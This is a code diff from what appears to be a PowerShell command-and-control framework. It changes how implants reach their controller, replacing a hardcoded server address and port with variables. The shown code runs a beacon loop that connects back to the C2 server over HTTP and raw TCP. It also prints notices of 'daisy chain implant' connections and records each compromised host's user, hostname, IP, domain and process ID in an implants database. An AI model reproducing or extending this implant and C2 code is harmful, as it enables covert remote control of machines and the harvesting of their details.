@@ -1212,8 +1212,8 @@ function Decrypt-String2($key, $encryptedStringWithIV) {
     #[System.Text.Encoding]::UTF8.GetString($output).Trim([char]0)
 }
 $RandomURI="'+$randomuri+'"
-$Server = "http://172.16.0.118:12345/'+$randomuri+'"
-$ServerClean = "http://172.16.0.118:12345/"
+$Server = "$server/'+$randomuri+'"
+$ServerClean = "$server/"
 while($true)
 {
     $date = (Get-Date -Format "dd/MMM/yyyy")
@@ -1266,7 +1266,7 @@ while($true)
 
             try
             {
-                $client = New-Object System.Net.Sockets.TCPClient("172.16.0.118", 12345)
+                $client = New-Object System.Net.Sockets.TCPClient("$serverhost", $serverport)
                 $stream = $client.GetStream()
                 $bytes = New-Object System.Byte[] 5520420                
                 $cookie = $ReadCommand + "NudsWdidf4reWDnNFUE"
@@ -1315,7 +1315,7 @@ $message =[Convert]::ToBase64String($Bytes)
         #$sound = new-Object System.Media.SoundPlayer;
         #$sound.SoundLocation="C:\Temp\PowershellC2\Sounds\pwned.wav";
         #$sound.Play()
-        Write-Host "New host connected: (uri=$randomuri, key=$key)" -ForegroundColor Green
+        Write-Host "New Daisy chain implant connected: (uri=$randomuri, key=$key)" -ForegroundColor Green
         Write-Host "$endpointip | PID:$im_pid | Sleep:$defaultbeacon | $im_computername $im_domain ($im_arch) "`n -ForegroundColor Green
 
         $Query = 'INSERT INTO Implants (RandomURI, User, Hostname, IpAddress, Key, FirstSeen, LastSeen, PID, Arch, Domain, Alive, Sleep, ModsLoaded)
